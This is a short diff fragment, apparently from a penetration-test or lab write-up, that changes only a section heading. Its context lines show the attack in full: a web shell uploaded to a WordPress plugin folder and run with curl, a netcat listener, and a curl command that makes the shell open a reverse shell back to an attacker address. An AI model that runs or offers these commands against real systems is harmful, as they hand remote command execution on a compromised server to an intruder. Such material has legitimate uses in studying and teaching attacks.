@@ -138,7 +138,7 @@ curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
 nc -lvnp 4444
 ```
 
-### 6.2 Reverse Shell Trigger
+### Reverse Shell Trigger
 
 ```bash
 curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "ip" 4444"
